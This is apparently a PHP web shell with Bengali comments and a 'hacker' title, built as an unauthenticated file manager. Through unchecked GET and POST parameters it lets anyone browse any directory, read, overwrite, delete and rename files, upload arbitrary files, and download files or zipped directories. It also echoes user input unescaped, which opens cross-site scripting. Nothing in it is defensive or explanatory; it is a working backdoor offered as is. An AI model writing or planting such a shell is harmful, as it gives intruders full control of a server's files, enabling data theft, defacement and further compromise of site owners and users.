<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iamH4CKEERRRRRRRRRRRS</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #00d1b2;
            margin: 10px;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 81px;
            box-shadow: 0 0 110px rgba(0, 209, 178, 0.6);
        }
        table {
            width:100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ff00e6;
        }
        th, td {
            padding: 10px;
            text-align: center;
            color: #fff;
        }
        th {
            background-color: #00d1b2;
            color: #000;
        }
        .file-actions {
            display: flex;
            justify-content: space-evenly;
            align-items: center;
            gap: 4px;
        }
        .file-actions button, .file-actions a {
            background-color: #00d1b2;
            color: #000;
            border: none;
            padding: 8px 12px;
            cursor: pointer;
            border-radius: 6px;
            font-size: 14px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .file-actions a {
            text-decoration: none;
            color: #000;
        }
        .file-actions button:hover, .file-actions a:hover {
            background-color: #00ffda;
        }
        .icon {
            font-size: 18px;
        }
        input[type="text"] {
            width: 100px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #00d1b2;
            background-color: #1a1a1a;
            color: #fff;
            border-radius: 4px;
        }
        .path-input {
            width: 100%;
            padding: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            background-color: #bf1111;
            color: #00d1b2;
            border: 1px solid #00d1b2;
            border-radius: 4px;
        }
    </style>
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <h1 style="font-size: 18px; text-align: center;">I am a hacker in the dark of a very cold night</h1>

        <!-- বর্তমান পাথ দেখানো -->
        <h3 style="font-size: 15px;">path :<?php echo getcwd(); ?></h3>

        <!-- ম্যানুয়ালি পাথ লিখে ডিরেক্টরিতে যাওয়া -->
        <form method="GET">
            <input class="path-input" type="text" name="dir" placeholder="User Guide..." value="<?php echo isset($_GET['dir']) ? $_GET['dir'] : getcwd(); ?>">
            <button type="submit" name="go_to_dir"><i class="fas fa-folder-open icon"></i>change directory</button>
        </form>
<h3 style="font-size: 14px;">upload file:</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload">
            <button type="submit" name="upload"><i class="fas fa-upload icon"></i> upload</button>
        </form>
	

      
    </div>
        <h3 style="font-size: 14px;"><font color="white">List of files:</h3>
        <table>
            <tr>
                <th>name file</th>
                <th>size</th>
                <th>edit</th>
                <th>permission</th>
                <th>action</th>
            </tr>
            <?php
			 // ফাইল এডিট করার অংশ
    if (isset($_GET['edit'])) {
        $file_to_edit = $_GET['edit'];
        if (file_exists($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            echo '<div class="container">';
            echo '<h3>Edit the file: ' . basename($file_to_edit) . '</h3>';
            echo '<form method="POST">';
            echo '<textarea name="edited_content" rows="15" style="width: 100%;">' . htmlspecialchars($file_content) . '</textarea>';
            echo '<br><button type="submit" name="save_edits"><i class="fas fa-save icon"></i> save</button>';
            echo '</form>';
            echo '</div>';
        } else {
            echo "<script>alert('file not found!');window.location.href='';</script>";
        }
    }

    // ফাইলের এডিট সেভ করার অংশ
    if (isset($_POST['save_edits'])) {
        $edited_content = $_POST['edited_content'];
        $file_to_edit = $_GET['edit'];
        if (file_exists($file_to_edit)) {
            file_put_contents($file_to_edit, $edited_content);
            echo "<script>alert('file saved successfully!');window.location.href='';</script>";
        } else {
            echo "<script>alert('file not found!');window.location.href='';</script>";
        }
    }

            $current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // বর্তমান ডিরেক্টরি
            if (!is_dir($current_dir)) {
                $current_dir = getcwd(); // যদি ডিরেক্টরি না হয়, তবে ডিফল্ট বর্তমান ডিরেক্টরিতে রিডাইরেক্ট করা হবে
            }
            $files = scandir($current_dir); // ডিরেক্টরির সব ফাইল বের করা
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $full_path = $current_dir . '/' . $file;
                    $is_dir = is_dir($full_path);
                    echo "<tr>";
                    echo "<td>" . ($is_dir ? "<a href='?dir=" . urlencode($full_path) . "'>" . $file . "</a>" : $file) . "</td>";
                    echo "<td>" . ($is_dir ? '-' : filesize($full_path) . " KB") . "</td>";
                    echo "<td>" . date("F d Y H:i:s", filemtime($full_path)) . "</td>";
                    echo "<td>" . substr(sprintf('%o', fileperms($full_path)), -4) . "</td>"; // পারমিশন দেখায়
                    echo "<td class='file-actions'>
                        <a href='?edit=$full_path' title='edit'><i class='fas fa-edit icon'></i></a>
                        <form method='POST' style='display:inline;'>
                            <input type='hidden' name='filename' value='$file'>
                            <button type='submit' name='delete' title='delete'><i class='fas fa-trash icon'></i></button>
                        </form>
                        <a href='?download=$full_path' title='download'><i class='fas fa-download icon'></i></a>
                        <form method='POST' style='display:inline;'>
                            <input type='hidden' name='oldname' value='$file'>
                            <input type='text' name='newname' placeholder='new name'>
                            <button type='submit' name='rename' title='rename'><i class='fas fa-pen icon'></i></button>
                        </form>
                    </td>";
                    echo "</tr>";
                }
            }
            ?>
        </table>

        

    

    <?php
   
    // ফাইল ডিলিট করা
    if (isset($_POST['delete'])) {
        $filename = $_POST['filename'];
        $file_to_delete = $current_dir . '/' . $filename;
        if (file_exists($file_to_delete)) {
            unlink($file_to_delete);
            echo "<script>alert('File deleted successfully!');window.location.href='';</script>";
        } else {
            echo "<script>alert('File not found!');window.location.href='';</script>";
        }
    }

    // ফাইল রিনেম করা
    if (isset($_POST['rename'])) {
        $oldname = $_POST['oldname'];
        $newname = $_POST['newname'];
        if (file_exists($current_dir . '/' . $oldname)) {
            rename($current_dir . '/' . $oldname, $current_dir . '/' . $newname);
            echo "<script>alert('The file name has been changed!');window.location.href='';</script>";
        } else {
            echo "<script>alert('File not found!');window.location.href='';</script>";
        }
    }

    // ফাইল আপলোড করা
    if (isset($_POST['upload'])) {
        $target_dir = $current_dir . "/";
        $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<script>alert('File uploaded successfully!');window.location.href='';</script>";
        } else {
            echo "<script>alert('File upload failed!');window.location.href='';</script>";
        }
    }

    // ফাইল ডাউনলোড করা (একটি ফাইল)
    if (isset($_GET['download'])) {
        $file_to_download = $_GET['download'];
        if (file_exists($file_to_download)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
            header('Content-Length: ' . filesize($file_to_download));
            readfile($file_to_download);
            exit;
        } else {
            echo "<script>alert('File not found!');window.location.href='';</script>";
        }
    }

    // সব ফাইল ডাউনলোড করা (ZIP)
    if (isset($_POST['download_all'])) {
        // ZIP ফাইলের নাম এবং অবস্থান
        $zip_file = 'all_files.zip';
        
        // ZIP ক্লাস ব্যবহার করে ফাইল কম্প্রেস করা
        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            // ডিরেক্টরির ফাইলগুলো লুপ করে ZIP এ যোগ করা
            $files = scandir($current_dir);
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $file_path = $current_dir . '/' . $file;
                    if (is_file($file_path)) {
                        $zip->addFile($file_path, basename($file_path));
                    }
                }
            }
            $zip->close();

            // ZIP ফাইল ডাউনলোড করা
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($zip_file) . '"');
            header('Content-Length: ' . filesize($zip_file));
            flush();
            readfile($zip_file);

            // ডাউনলোড শেষে ZIP ফাইল মুছে ফেলা
            unlink($zip_file);
            exit;
        } else {
            echo "<script>alert('ZIP Failed to create file!!');</script>";
        }
    }
    ?>
</body>
</html>